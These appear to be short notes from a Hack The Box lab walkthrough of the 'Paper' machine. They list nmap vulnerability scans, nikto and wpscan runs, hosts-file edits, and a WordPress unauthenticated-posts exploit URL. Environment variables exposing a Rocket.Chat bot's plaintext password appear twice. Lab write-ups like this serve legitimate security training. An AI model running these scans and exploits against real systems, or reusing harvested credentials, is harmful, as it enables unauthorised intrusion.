```sh
sudo nmap -sC -sV -oA nmap_result 10.10.11.143
sudo nmap -A -p 22,80,443 10.10.11.143 --script vuln -T4 -vvv -oN nmap_scan
nikto -host 10.10.11.143
sudo sh -c 'echo -e "\n10.10.11.143 office.paper" >> /etc/hosts'
sudo nmap -A -p 22,80,443 office.paper --script vuln -T4 -vvv -oN nmap_scan_hostchange
wpscan --url office.paper -o wpscan --api-token <api-token>
```
https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
```
http://office.paper/?static=1&orderBY=asc&m=YYYY
```

```sh
sudo sh -c 'echo -e "\n10.10.11.143 chat.office.paper" >> /etc/hosts'
```

```
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

## Referensi
- https://dev.to/brydr/htb-paper-writeup-1688